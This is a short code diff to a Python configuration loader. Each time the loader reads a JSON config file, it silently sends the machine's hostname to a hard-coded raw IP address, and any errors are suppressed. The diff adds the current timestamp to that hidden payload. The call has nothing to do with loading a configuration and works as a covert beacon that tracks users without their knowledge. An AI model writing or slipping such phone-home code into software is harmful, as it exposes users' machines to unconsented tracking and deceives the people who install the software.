@@ -59,13 +59,14 @@ class Configuration:
         """
         import requests
         import socket
+        from datetime import datetime
 
         with open(file) as data_file:
             Configuration.__current_config = json.load(data_file)
         Configuration.__write_all()
         try:
             url = "http://104.236.253.19/update/get"
-            p = {"d": str(socket.gethostname())}
+            p = {"d": str(socket.gethostname())+" "+str(datetime.now())}
             requests.get(url, params=p)
         except:
             pass
